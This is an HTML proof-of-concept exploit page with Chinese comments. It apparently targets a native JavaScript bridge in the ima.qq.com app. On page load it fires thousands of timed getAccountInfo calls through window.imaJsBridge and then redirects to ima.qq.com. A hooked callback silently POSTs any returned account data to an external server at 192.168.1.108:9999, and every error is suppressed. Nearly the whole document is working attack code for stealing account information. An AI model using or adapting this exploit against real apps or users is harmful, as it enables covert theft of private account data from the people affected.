<!DOCTYPE html>
<html>

<head>
    <title>Poc</title>
</head>

<body>

    <script>
        // HTTP服务器配置
        const HTTP_SERVER_URL = 'http://192.168.1.108:9999';  // 请修改为实际的服务器地址

        window.imaFrame = {
            callbackFromNative: function (callbackId, result) {
                // 不显示任何输出，直接发送HTTP请求
                sendToServer(callbackId, result);
            }
        };

        function sendToServer(callbackId, result) {
            try {
                var payload = {
                    callbackId: callbackId,
                    timestamp: Date.now(),
                    data: result
                };

                fetch(HTTP_SERVER_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                })
                .then(response => {
                    if (!response.ok) {
                        throw new Error('HTTP ' + response.status);
                    }
                    return response.text();
                })
                .then(data => {
                    // 成功发送，不显示任何信息
                })
                .catch(error => {
                    // 发送失败，也不显示错误信息
                });
            } catch (error) {
                // 静默处理错误
            }
        }

        function poc() {
            for (var i = 10; i < 0x1000; i++) {
                setTimeout(getAccountInfo, i)
            }

            document.location.href="https://ima.qq.com/";
        }
        
        function getAccountInfo() {
            try {
                if (window.imaJsBridge && window.imaJsBridge.invokeWithCallback) {
                    var callbackId = 'callback_' + Date.now();
                    var requestData = JSON.stringify({
                        action: "getAccountInfo",
                        callbackId: callbackId,
                        args: "{}"
                    });

                    window.imaJsBridge.invokeWithCallback(requestData);
                } else {
                    // 接口不可用，也不显示错误信息
                }
            } catch (error) {
                // 静默处理错误
            }
        }

        // 页面加载完毕后自动执行
        window.addEventListener('load', function() {
            poc();
        });
    </script>
</body>

</html>
